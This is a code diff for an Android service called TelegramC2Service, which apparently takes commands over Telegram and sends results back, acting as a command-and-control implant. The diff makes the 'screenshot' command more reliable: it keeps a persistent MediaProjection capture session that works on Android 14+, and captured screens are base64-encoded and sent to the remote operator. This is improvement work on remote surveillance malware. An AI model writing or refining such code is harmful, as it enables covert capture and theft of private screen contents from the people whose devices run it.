@@ -40,7 +40,9 @@ class TelegramC2Service : Service() {
         .build()
 
     private val deviceId: String by lazy { DeviceInfo.id(this) }
+
     @Volatile private var projection: MediaProjection? = null
+    @Volatile private var captureSession: ScreenCaptureSession? = null
     @Volatile private var lastUpdateId: Long = 0
 
     private fun log(msg: String) {
@@ -96,25 +98,41 @@ class TelegramC2Service : Service() {
     }
 
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
+        log("initProjection: code=$resultCode")
         try {
-            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            // Release any previous session cleanly
+            captureSession?.release()
+            captureSession = null
             try { projection?.stop() } catch (_: Exception) {}
             projection = null
-            val proj = mpm.getMediaProjection(resultCode, data) ?: run {
-                log("getMediaProjection returned null")
+
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val proj = mpm.getMediaProjection(resultCode, data)
+            log("getMediaProjection: $proj")
+            if (proj == null) {
+                log("getMediaProjection returned NULL")
                 return
             }
+
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
-                    projection = null
                     log("projection onStop")
+                    captureSession?.release()
+                    captureSession = null
+                    projection = null
                 }
             }, Handler(Looper.getMainLooper()))
+
             projection = proj
-            log("projection ACTIVE")
+
+            // Build the long-lived virtual display session ONCE.
+            // Subsequent captures reuse this session — required on Android 14+.
+            captureSession = ScreenCaptureSession(this, proj)
+            log("projection ACTIVE with capture session")
         } catch (e: Exception) {
             log("initProjection ERROR: ${e.message}")
             projection = null
+            captureSession = null
         }
     }
 
@@ -254,11 +272,12 @@ class TelegramC2Service : Service() {
             }
 
             "screenshot" -> {
-                val p = projection ?: run {
+                val session = captureSession
+                if (session == null) {
                     sendMessage("projection not active — open app and grant screen capture")
                     return
                 }
-                val res = Screenshot.capture(this, p)
+                val res = session.capture()
                 val b64 = res.optString("data_b64", "")
                 if (b64.isEmpty()) {
                     sendMessage("capture failed: ${res.optString("error")}")
@@ -403,6 +422,8 @@ class TelegramC2Service : Service() {
 
     override fun onDestroy() {
         log("onDestroy")
+        captureSession?.release()
+        captureSession = null
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
         scope.cancel()
